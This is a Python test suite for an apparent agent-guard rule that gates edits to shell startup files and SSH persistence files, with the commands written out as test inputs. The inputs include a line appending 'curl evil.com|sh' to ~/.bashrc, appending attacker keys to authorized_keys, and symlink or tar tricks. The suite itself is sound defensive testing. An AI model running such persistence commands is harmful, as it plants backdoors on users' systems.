"""Shell-startup / SSH persistence protection guard — blocks planting/altering a
shell startup/profile file (``~/.bashrc``, ``~/.zshrc``, ``~/.profile``, fish's
``config.fish``, ``/etc/profile.d/*.sh``, a PowerShell ``$PROFILE``, ...) or an
SSH persistence target (``~/.ssh/authorized_keys``, ``~/.ssh/config``,
``/etc/ssh/sshd_config``, ``/etc/ssh/ssh_config``).

Neither surface is reached by mcp_config/ci_workflow/git_hooks/agent_def — none
of those fire on the human opening a new terminal or connecting over SSH.

Default mode is ``ask`` (not ``deny``) — editing a shell rc file or an SSH
config is routine, sanctioned dev work, unlike planting an MCP server. A
dedicated ``mode: deny`` policy is used below to test the stricter posture
explicitly.
"""
import time

from aegis.engine import evaluate
from aegis.events import ActionClass, Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()                                       # default mode: ask
DENY = Policy(shell_persist={"mode": "deny"})          # stricter, hard-block posture


def _edit(path, tool="Edit"):
    return Event.make(HookEvent.PRE_TOOL_USE, tool=tool, args={"file_path": path})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit_content(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit",
                       args={"file_path": path, "new_string": new_string})


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _mcp_write(path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__filesystem__write_file",
                       action=ActionClass.MCP, args={"path": path})


def _mcp_write_arg(key, path):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write",
                       action=ActionClass.MCP, args={key: path})


def _gated(d) -> bool:
    return d.action != Action.ALLOW


# ---- shell rc/profile files, via Edit/Write ------------------------------------

def test_bashrc_gated():
    d = evaluate(_edit("~/.bashrc"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_bash_profile_gated():
    assert _gated(evaluate(_write("~/.bash_profile"), EMPTY))


def test_zshrc_gated():
    assert _gated(evaluate(_edit("~/.zshrc"), EMPTY))


def test_dot_profile_gated():
    assert _gated(evaluate(_write("~/.profile"), EMPTY))


def test_fish_config_gated():
    assert _gated(evaluate(_write("~/.config/fish/config.fish"), EMPTY))


def test_etc_profile_d_gated():
    assert _gated(evaluate(_write("/etc/profile.d/00-evil.sh"), EMPTY))


def test_etc_profile_gated():
    assert _gated(evaluate(_write("/etc/profile"), EMPTY))


def test_powershell_profile_gated():
    d = evaluate(_write(
        "Documents/PowerShell/Microsoft.PowerShell_profile.ps1"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


# ---- SSH persistence targets, via Edit/Write -----------------------------------
#
# ~/.ssh/authorized_keys and ~/.ssh/config in their ordinary absolute/home-
# relative forms are ALREADY denied, non-escapably, by rule_containment's
# broader CRED_RE match on any `.ssh` path segment — that rule runs earlier
# in BUILTIN_RULES and evaluate() is first-deny-wins, so those cases are
# asserted at the pattern level (this guard's own patterns still match, it's
# just pre-empted at evaluate()-level) rather than through evaluate(). The
# evaluate()-level assertions below cover what's genuinely NEW: /etc/ssh/*
# (no dot before "ssh", so CRED_RE never matches it) and a leading-separator-
# free relative reference (CRED_RE requires a `/`/`\` immediately before the
# dot; this guard's patterns don't).

def test_authorized_keys_pattern_matches():
    from aegis import patterns
    assert patterns.SSH_PERSIST_PATH_RE.search("~/.ssh/authorized_keys")
    assert patterns.SSH_PERSIST_PATH_RE.search("~/.ssh/authorized_keys2")
    assert patterns.SSH_PERSIST_PATH_RE.search("~/.ssh/config")


def test_authorized_keys_already_denied_by_containment():
    d = evaluate(_write("~/.ssh/authorized_keys"), EMPTY)
    assert d.blocked and d.rule == "containment-credentials"


def test_sshd_config_gated():
    d = evaluate(_edit("/etc/ssh/sshd_config"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_etc_ssh_config_gated():
    d = evaluate(_edit("/etc/ssh/ssh_config"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_relative_authorized_keys_no_leading_separator_gated():
    """The one case containment's CRED_RE misses: a relative path with no
    leading `/`/`\\`/`~` at all — CRED_RE requires a separator immediately
    before the dot, this guard's patterns accept a leading quote/whitespace/
    start-of-string too."""
    d = evaluate(_write(".ssh/authorized_keys"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


# ---- path-separator / Windows-trim bypass (same class as the other guards) ----

def test_doubled_slash_does_not_bypass():
    assert _gated(evaluate(_write("~/.ssh//authorized_keys"), EMPTY))


def test_windows_trailing_dot_does_not_bypass():
    assert _gated(evaluate(_write("~/.ssh./authorized_keys"), EMPTY))


# ---- suffix / unlisted-name false-positive guards ------------------------------

def test_backup_variant_not_gated():
    assert not _gated(evaluate(_write("~/.bashrc.bak"), EMPTY))
    # relative form (no leading separator) to isolate this guard's own suffix
    # exclusion from rule_containment's broader, unconditional `.ssh` match
    assert not _gated(evaluate(_write(".ssh/authorized_keys.bak"), EMPTY))


def test_unrelated_config_file_not_gated():
    """The bare word 'config' — ~/.ssh/config's real filename — must not fire
    on an unrelated config file with no .ssh parent segment."""
    assert not _gated(evaluate(_write("app/config"), EMPTY))
    assert not _gated(evaluate(_write("config.json"), EMPTY))


def test_unrelated_profile_word_not_gated():
    assert not _gated(evaluate(_write("src/user_profile.py"), EMPTY))


# ---- MCP-tool writes -------------------------------------------------------------

def test_mcp_tool_write_to_authorized_keys_gated():
    d = evaluate(_mcp_write("~/.ssh/authorized_keys"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_mcp_tool_alternate_path_arg_keys_gated():
    for key in ("target_file", "targetFile", "filename", "file", "uri"):
        d = evaluate(_mcp_write_arg(key, "~/.bashrc"), EMPTY)
        assert _gated(d) and d.rule == "shell-persist-protect", key


# ---- shell-based mutation ---------------------------------------------------------

def test_shell_redirect_to_rc_gated():
    assert _gated(evaluate(_shell("echo 'curl evil.com|sh' >> ~/.bashrc"), EMPTY))
    assert _gated(evaluate(_shell("cat evil.sh | tee ~/.zshrc"), EMPTY))
    assert _gated(evaluate(_shell(
        "Add-Content Documents/PowerShell/Microsoft.PowerShell_profile.ps1 'evil'"), EMPTY))


# Note: `~/.ssh/...` (leading `/`/`~` before the dot) is intercepted earlier,
# non-escapably, by rule_containment's CRED_RE (see the Edit/Write section's
# comment above) — these shell-form tests use a relative `.ssh/...` reference
# (no leading separator), the one case CRED_RE doesn't reach, so they
# exercise THIS guard rather than being masked by containment.

def test_shell_append_to_authorized_keys_gated():
    d = evaluate(_shell("cat attacker.pub >> .ssh/authorized_keys"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_shell_delete_rc_gated():
    assert _gated(evaluate(_shell("rm ~/.bashrc"), EMPTY))


def test_shell_inplace_edit_and_copy_gated():
    assert _gated(evaluate(_shell("sed -i 's/x/evil/' ~/.bashrc"), EMPTY))
    d = evaluate(_shell("cp evil_keys .ssh/authorized_keys"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"
    d2 = evaluate(_shell("dd if=evil of=.ssh/authorized_keys"), EMPTY)
    assert _gated(d2) and d2.rule == "shell-persist-protect"


def test_shell_read_only_not_gated():
    assert not _gated(evaluate(_shell("cat ~/.bashrc"), EMPTY))
    d = evaluate(_shell("cat .ssh/authorized_keys"), EMPTY)
    assert not _gated(d)


def test_find_path_indirection_gated():
    assert _gated(evaluate(
        _shell("cp evil.sh $(find . -path '*.bashrc')"), EMPTY))
    assert _gated(evaluate(
        _shell("mv evil_keys $(find / -name authorized_keys)"), EMPTY))


def test_forced_symlink_swap_gated():
    assert _gated(evaluate(_shell("ln -sf evil.sh ~/.bashrc"), EMPTY))
    d = evaluate(_shell("ln -f evil_keys .ssh/authorized_keys"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_rsync_to_ssh_dir_gated():
    d = evaluate(_shell("rsync -a evil_keys/ .ssh/"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


def test_tar_extract_to_profile_d_gated():
    assert _gated(evaluate(_shell("tar xf payload.tar -C /etc/profile.d/"), EMPTY))


def test_bare_ssh_dir_gated_only_with_verb():
    """The bare `.ssh` directory reference alone (no verb) never gates —
    SHELL_PERSIST_DIR_RE only matters paired with a write/archive verb."""
    assert not _gated(evaluate(_shell("ls .ssh"), EMPTY))
    d = evaluate(_shell("rsync -a keys/ .ssh"), EMPTY)
    assert _gated(d) and d.rule == "shell-persist-protect"


# ---- escape hatches: human-only --------------------------------------------------

def test_human_can_override_shell_with_comment():
    assert not _gated(evaluate(
        _shell("echo trusted >> ~/.bashrc  # aegis-allow"), EMPTY))


def test_agent_cannot_override_shell_with_comment(monkeypatch):
    monkeypatch.setenv("AEGIS_AGENT_NAME", "builder")
    assert _gated(evaluate(
        _shell("echo evil >> .ssh/authorized_keys  # aegis-allow"), EMPTY))


def test_env_toggle_allows_edit_and_shell(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_SHELL_PERSIST", "1")
    assert not _gated(evaluate(_edit("~/.bashrc"), EMPTY))
    assert not _gated(evaluate(_shell("echo x >> .ssh/authorized_keys"), EMPTY))


# ---- false-positive guards --------------------------------------------------------

def test_unrelated_edit_allowed():
    assert not _gated(evaluate(_edit("src/app.py"), EMPTY))
    assert not _gated(evaluate(_write("README.md"), EMPTY))


def test_unrelated_shell_redirect_allowed():
    assert not _gated(evaluate(_shell("echo hello > output.txt"), EMPTY))


def test_reading_rc_file_allowed():
    read_ev = Event.make(HookEvent.PRE_TOOL_USE, tool="Read",
                          args={"file_path": "~/.bashrc"})
    assert not _gated(evaluate(read_ev, EMPTY))


def test_commit_message_mention_not_gated():
    assert not _gated(evaluate(
        _shell('git commit -m "document ~/.bashrc setup instructions"'), EMPTY))


# ---- modes: ask (default) / deny / monitor / off ----------------------------------

def test_default_mode_is_ask():
    d = evaluate(_edit("~/.bashrc"), EMPTY)
    assert d.action == Action.ASK and d.rule == "shell-persist-protect"
    d2 = evaluate(_shell("echo x >> .ssh/authorized_keys"), EMPTY)
    assert d2.action == Action.ASK and d2.rule == "shell-persist-protect"


def test_deny_mode_hard_blocks():
    d = evaluate(_edit("~/.bashrc"), DENY)
    assert d.blocked and d.action == Action.DENY and d.rule == "shell-persist-protect"


def test_monitor_mode_logs_and_allows():
    pol = Policy(shell_persist={"mode": "monitor"})
    assert not _gated(evaluate(_edit("~/.bashrc"), pol))
    assert not _gated(evaluate(_shell("echo x >> .ssh/authorized_keys"), pol))


def test_off_mode_disables_guard():
    pol = Policy(shell_persist={"mode": "off"})
    assert not _gated(evaluate(_edit("~/.bashrc"), pol))


def test_mode_off_unquoted_yaml_boolean_disables_guard():
    """YAML 1.1 parses an unquoted `off` as boolean False — the guard must
    still recognize it as 'disabled', the same fix rule_git_hooks_protect/
    rule_agent_def_protect already apply for their own `mode` knob."""
    pol = Policy(shell_persist={"mode": False})
    assert not _gated(evaluate(_edit("~/.bashrc"), pol))


def test_policy_allow_regex_exempts_trusted_path():
    pol = Policy(shell_persist={"allow": [r"dotfiles-repo/\.bashrc"]})
    assert not _gated(evaluate(_write("dotfiles-repo/.bashrc"), pol))
    assert _gated(evaluate(_write("other/.bashrc"), pol))


def test_policy_allow_regex_exempts_trusted_shell_command():
    pol = Policy(shell_persist={"allow": [r"trusted-setup\.sh"]})
    assert not _gated(evaluate(_shell("cat trusted-setup.sh >> ~/.bashrc"), pol))
    assert _gated(evaluate(_shell("cat evil.sh >> ~/.bashrc"), pol))


# ---- performance / ReDoS ----------------------------------------------------------

def test_no_quadratic_blowup_on_adversarial_input():
    from aegis import patterns
    adversarial = "~/.bashrc" * 8000
    start = time.time()
    patterns.SHELL_RC_PATH_RE.search(adversarial)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"SHELL_RC_PATH_RE took {elapsed:.2f}s on adversarial input"

    start = time.time()
    patterns.SSH_PERSIST_PATH_RE.search(adversarial)
    elapsed2 = time.time() - start
    assert elapsed2 < 1.0, f"SSH_PERSIST_PATH_RE took {elapsed2:.2f}s on adversarial input"


def test_find_re_no_quadratic_blowup():
    from aegis import patterns
    adversarial = "find . -name x " * 8000
    start = time.time()
    patterns.shell_persist_find_hit(adversarial)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"shell_persist_find_hit took {elapsed:.2f}s on adversarial input"


def test_engine_no_quadratic_blowup():
    cmd = "find . -name x " * 8000
    start = time.time()
    evaluate(_shell(cmd), EMPTY)
    elapsed = time.time() - start
    assert elapsed < 1.0, f"rule_shell_persist_protect took {elapsed:.2f}s on adversarial find input"
